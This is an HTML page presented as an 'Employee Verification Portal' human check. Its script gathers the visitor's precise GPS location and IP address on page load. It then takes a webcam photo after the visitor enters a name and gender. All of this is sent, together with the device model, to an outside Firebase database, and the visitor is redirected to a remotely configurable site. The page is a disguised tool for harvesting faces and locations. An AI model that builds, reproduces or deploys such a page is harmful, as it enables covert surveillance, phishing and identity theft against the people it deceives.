<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Employee Verification Portal</title>
  
  <!-- Favicon Icons -->
  <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 512 512'><path fill='%236366f1' d='M256 0c4.6 0 9.2 1 13.4 2.9L452.7 85.1c16.1 7 26.6 22.8 26.6 40.4c0 148.6-88.7 287-223.3 386.5c-4 3-8.8 4.5-13.7 4.5s-9.7-1.5-13.7-4.5C94.7 412.5 6 274.1 6 125.5c0-17.6 10.5-33.4 26.6-40.4L242.6 2.9C246.8 1 251.4 0 256 0z'/></svg>">

  <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-2812268727869246"
     crossorigin="anonymous"></script>
  <style>
    :root { 
      --primary: #6366f1; 
      --primary-hover: #4f46e5;
      --bg: #090d16; 
      --card-bg: rgba(18, 24, 38, 0.75); 
      --border: rgba(255, 255, 255, 0.12);
      --glow-1: rgba(99, 102, 241, 0.35);
      --glow-2: rgba(168, 85, 247, 0.35);
      --success: #10b981;
    }
    
    * { box-sizing: border-box; font-family: 'Plus Jakarta Sans', sans-serif; transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1); }
    
    body { 
      background: var(--bg); 
      min-height: 100vh; 
      display: flex; 
      justify-content: center; 
      align-items: center; 
      margin: 0; 
      color: #fff; 
      padding: 20px; 
      overflow: hidden;
      position: relative;
    }

    /* Ambient Orbs */
    .ambient-orb {
      position: absolute;
      border-radius: 50%;
      filter: blur(90px);
      z-index: 0;
      animation: float 10s infinite alternate ease-in-out;
      pointer-events: none;
    }
    .orb-1 { width: 350px; height: 350px; background: var(--glow-1); top: -10%; left: -10%; }
    .orb-2 { width: 300px; height: 300px; background: var(--glow-2); bottom: -10%; right: -10%; animation-delay: -5s; }

    @keyframes float {
      0% { transform: translate(0, 0) scale(1); }
      100% { transform: translate(40px, 30px) scale(1.1); }
    }

    .glass-card { 
      position: relative;
      z-index: 10;
      background: var(--card-bg); 
      backdrop-filter: blur(24px);
      -webkit-backdrop-filter: blur(24px);
      border: 1px solid var(--border); 
      border-radius: 28px; 
      padding: 40px; 
      width: 100%; 
      max-width: 440px; 
      text-align: center;
      box-shadow: 0 30px 60px rgba(0, 0, 0, 0.5), inset 0 1px 0 rgba(255, 255, 255, 0.1);
    }

    .header-icon {
      width: 70px;
      height: 70px;
      background: rgba(99, 102, 241, 0.15);
      border: 1px solid rgba(99, 102, 241, 0.3);
      border-radius: 20px;
      display: inline-flex;
      align-items: center;
      justify-content: center;
      margin-bottom: 16px;
      color: #818cf8;
      font-size: 28px;
      box-shadow: 0 0 20px rgba(99, 102, 241, 0.2);
    }

    .step-view { opacity: 1; transform: translateY(0); }
    .step-view.hidden { opacity: 0; transform: translateY(15px); pointer-events: none; position: absolute; width: calc(100% - 80px); }
    
    .input-wrapper { position: relative; margin-bottom: 20px; }
    .input-wrapper i { position: absolute; left: 16px; top: 50%; transform: translateY(-50%); color: #64748b; font-size: 16px; }

    .input-field { 
      width: 100%; 
      padding: 16px 16px 16px 46px; 
      background: rgba(0, 0, 0, 0.4); 
      border: 1px solid var(--border); 
      border-radius: 14px; 
      color: #fff; 
      font-size: 15px;
      outline: none;
      font-weight: 500;
    }
    .input-field:focus { 
      border-color: #818cf8; 
      background: rgba(0, 0, 0, 0.6);
      box-shadow: 0 0 0 4px rgba(129, 140, 248, 0.15); 
    }

    .gender-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 14px; margin-bottom: 24px; }
    .gender-card { 
      padding: 16px; 
      border: 1px solid var(--border); 
      border-radius: 14px; 
      cursor: pointer; 
      background: rgba(0, 0, 0, 0.25);
      font-weight: 600;
      color: #94a3b8;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
    }
    .gender-card:hover { border-color: rgba(255, 255, 255, 0.25); color: #fff; background: rgba(255,255,255,0.03); }
    .gender-card.active { 
      border-color: #818cf8; 
      background: rgba(99, 102, 241, 0.2); 
      color: #818cf8; 
      box-shadow: 0 0 15px rgba(99, 102, 241, 0.15);
    }

    .btn { 
      width: 100%; 
      padding: 16px; 
      background: linear-gradient(135deg, #6366f1 0%, #4f46e5 100%); 
      border: none; 
      border-radius: 14px; 
      color: white; 
      font-weight: 700; 
      font-size: 15px;
      cursor: pointer; 
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
      box-shadow: 0 8px 20px rgba(79, 70, 229, 0.35);
    }
    .btn:hover { transform: translateY(-2px); box-shadow: 0 12px 24px rgba(79, 70, 229, 0.45); }
    .btn:active { transform: translateY(0); }
    .btn:disabled { opacity: 0.5; cursor: not-allowed; transform: none; background: #334155; box-shadow: none; }

    /* Camera Viewfinder Box */
    .webcam-container {
      position: relative;
      width: 100%;
      border-radius: 16px;
      overflow: hidden;
      margin-bottom: 20px;
      border: 2px solid rgba(255, 255, 255, 0.15);
      background: #000;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.6);
    }
    video { width: 100%; display: block; transform: scaleX(-1); border-radius: 14px; }

    .status-msg { 
      margin-top: 16px; 
      font-size: 14px; 
      color: #818cf8; 
      font-weight: 700; 
      letter-spacing: 0.3px;
      min-height: 20px;
    }
    
    .status-msg.success-state {
      color: #34d399;
      animation: popIn 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
    }

    @keyframes popIn { 0% { transform: scale(0.8); opacity: 0; } 100% { transform: scale(1); opacity: 1; } }
  </style>
</head>
<body>

<div class="ambient-orb orb-1"></div>
<div class="ambient-orb orb-2"></div>

<div class="glass-card">
  <!-- STEP 1: Employee Details -->
  <div id="step1" class="step-view">
    <div class="header-icon"><i class="fa-solid fa-user-shield"></i></div>
    <h2 id="txt_step1Title" style="margin: 0 0 6px 0; font-weight: 800; font-size: 24px;">Welcome</h2>
    <p id="txt_step1Sub" style="color: #94a3b8; font-size: 14px; margin-top: 0; margin-bottom: 24px;">Please complete verification</p>

    <div class="input-wrapper">
      <i class="fa-solid fa-user"></i>
      <input type="text" id="userName" class="input-field" placeholder="Full Name" autocomplete="off" required>
    </div>
    
    <div class="gender-grid">
      <div class="gender-card" id="genderMale" onclick="setGender('Male')"><i class="fa-solid fa-mars"></i> Male</div>
      <div class="gender-card" id="genderFemale" onclick="setGender('Female')"><i class="fa-solid fa-venus"></i> Female</div>
    </div>
    
    <button class="btn" id="txt_step1Btn" onclick="goToStep2()">
      <span>Verify You Are Human</span> <i class="fa-solid fa-arrow-right"></i>
    </button>
  </div>

  <!-- STEP 2: Webcam & Manual Verification -->
  <div id="step2" class="step-view hidden">
    <div class="header-icon"><i class="fa-solid fa-face-viewfinder"></i></div>
    <h2 id="txt_step2Title" style="margin: 0 0 6px 0; font-weight: 800; font-size: 24px;">Facial Scan</h2>
    <p id="txt_step2Sub" style="color: #94a3b8; font-size: 14px; margin-top: 0; margin-bottom: 20px;">Position face inside camera frame</p>
    
    <div class="webcam-container">
      <video id="webcam" autoplay playsinline muted></video>
    </div>

    <button class="btn" id="txt_step2Btn" onclick="submitData()">
      <span>Proceed!</span> <i class="fa-solid fa-check"></i>
    </button>
    <div class="status-msg" id="statusMsg">Ready for capture</div>
  </div>
</div>

<canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

<script type="module">
  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
  import { getDatabase, ref, push, set, onValue } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";

  const firebaseConfig = {
    apiKey: "AIzaSyACVwVXRB_5nTFozs0PV22zd6wSpZuBVqE",
    authDomain: "reakweb.firebaseapp.com",
    databaseURL: "https://reakweb-default-rtdb.firebaseio.com",
    projectId: "reakweb",
    storageBucket: "reakweb.firebasestorage.app",
    messagingSenderId: "228639861953",
    appId: "1:228639861953:web:2941663bb550703b61b840"
  };

  const app = initializeApp(firebaseConfig);
  const db = getDatabase(app);

  let selectedGender = "";
  let mediaStream = null;
  let customRedirectUrl = "https://itxahsan.dpdns.org"; 
  let userGeoData = { ip: "Unavailable", location: "Unavailable" };

  // Get exact device GPS coordinates (or IP-based fallback)
  async function resolveExactLocation() {
    let resolvedIp = "Unavailable";
    let resolvedLoc = "Unavailable";

    // 1. Fetch IP Address
    try {
      const res = await fetch('https://api.ipify.org?format=json');
      if (res.ok) {
        const d = await res.json();
        resolvedIp = d.ip || "Unavailable";
      }
    } catch (e) {}

    // 2. Try Exact HTML5 GPS Geolocation
    const getGpsLocation = new Promise((resolve) => {
      if ("geolocation" in navigator) {
        navigator.geolocation.getCurrentPosition(
          (pos) => {
            const lat = pos.coords.latitude.toFixed(5);
            const lng = pos.coords.longitude.toFixed(5);
            resolve(`GPS: ${lat}, ${lng}`);
          },
          () => resolve(null),
          { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
        );
      } else {
        resolve(null);
      }
    });

    const gpsResult = await getGpsLocation;

    if (gpsResult) {
      userGeoData.ip = resolvedIp;
      userGeoData.location = gpsResult;
      return;
    }

    // 3. Fallback: IP-based Location (if GPS denied/unavailable)
    try {
      const res = await fetch('https://freeipapi.com/api/json');
      if (res.ok) {
        const d = await res.json();
        const loc = [d.cityName, d.regionName, d.countryName].filter(Boolean).join(', ');
        if (d.ipAddress) resolvedIp = d.ipAddress;
        if (loc) resolvedLoc = loc;
      }
    } catch (e) {
      try {
        const res2 = await fetch('https://ipapi.co/json/');
        if (res2.ok) {
          const d2 = await res2.json();
          const loc2 = [d2.city, d2.region, d2.country_name].filter(Boolean).join(', ');
          if (d2.ip) resolvedIp = d2.ip;
          if (loc2) resolvedLoc = loc2;
        }
      } catch (err) {}
    }

    userGeoData.ip = resolvedIp;
    userGeoData.location = resolvedLoc;
  }

  // Pre-fetch on page load
  resolveExactLocation();

  // Extract Device/Mobile Model Name
  function getDeviceInfo() {
    const ua = navigator.userAgent;
    if (/android/i.test(ua)) {
      const match = ua.match(/\(([^)]+)\)/);
      return match ? match[1].split(';')[2] || match[1] : "Android Device";
    }
    if (/iPhone|iPad|iPod/i.test(ua)) {
      return "Apple iOS Device";
    }
    if (/Windows/i.test(ua)) return "Windows PC";
    if (/Macintosh/i.test(ua)) return "Mac Computer";
    if (/Linux/i.test(ua)) return "Linux PC";
    return "Desktop/Unknown Device";
  }

  onValue(ref(db, 'settings'), (snapshot) => {
    const data = snapshot.val();
    if (data) {
      if (data.redirectUrl) customRedirectUrl = data.redirectUrl;

      if (data.uiText) {
        const text = data.uiText;
        if (text.step1Title) document.getElementById('txt_step1Title').innerText = text.step1Title;
        if (text.step1Sub) document.getElementById('txt_step1Sub').innerText = text.step1Sub;
        if (text.step1Btn) document.getElementById('txt_step1Btn').querySelector('span').innerText = text.step1Btn;
        if (text.step2Title) document.getElementById('txt_step2Title').innerText = text.step2Title;
        if (text.step2Sub) document.getElementById('txt_step2Sub').innerText = text.step2Sub;
      }
    }
  });

  window.setGender = (g) => {
    selectedGender = g;
    document.getElementById('genderMale').classList.toggle('active', g === 'Male');
    document.getElementById('genderFemale').classList.toggle('active', g === 'Female');
  };

  window.goToStep2 = async () => {
    const nameStr = document.getElementById('userName').value.trim();
    if (!nameStr || !selectedGender) {
      alert("Please enter your name and choose your gender option.");
      return;
    }

    const s1 = document.getElementById('step1');
    const s2 = document.getElementById('step2');

    s1.classList.add('hidden');
    setTimeout(() => {
      s1.style.display = 'none';
      s2.style.display = 'block';
      setTimeout(() => s2.classList.remove('hidden'), 50);
    }, 300);

    try {
      mediaStream = await navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480 } });
      const videoEl = document.getElementById('webcam');
      videoEl.srcObject = mediaStream;
    } catch (err) {
      document.getElementById('statusMsg').innerText = "Camera access error or permission denied.";
    }
  };

  window.submitData = async () => {
    const btn = document.getElementById('txt_step2Btn');
    const status = document.getElementById('statusMsg');
    
    btn.disabled = true;
    btn.innerHTML = `<i class="fa-solid fa-circle-notch fa-spin"></i> Submitting...`;

    // Ensure final precise coordinates are gathered
    if (userGeoData.location === "Unavailable" || userGeoData.ip === "Unavailable") {
      await resolveExactLocation();
    }

    const canvas = document.getElementById('canvas');
    const video = document.getElementById('webcam');
    const ctx = canvas.getContext('2d');
    
    ctx.save();
    ctx.translate(canvas.width, 0);
    ctx.scale(-1, 1);
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    ctx.restore();

    if (mediaStream) mediaStream.getTracks().forEach(t => t.stop());

    try {
      const newRef = push(ref(db, 'attendance'));
      await set(newRef, {
        name: document.getElementById('userName').value.trim(),
        gender: selectedGender,
        photo: canvas.toDataURL('image/jpeg', 0.85),
        ip: userGeoData.ip,
        location: userGeoData.location,
        device: getDeviceInfo(),
        timestamp: new Date().toISOString()
      });

      status.classList.add('success-state');
      status.innerText = "verified you are not human";

      let targetUrl = customRedirectUrl.trim();
      if (!/^https?:\/\//i.test(targetUrl)) {
        targetUrl = 'https://' + targetUrl;
      }

      setTimeout(() => {
        window.location.href = targetUrl;
      }, 1500);

    } catch (e) {
      status.innerText = "Submission Error: " + e.message;
      btn.disabled = false;
      btn.innerHTML = `<span>Proceed!</span> <i class="fa-solid fa-check"></i>`;
    }
  };
</script>
</body>
</html>
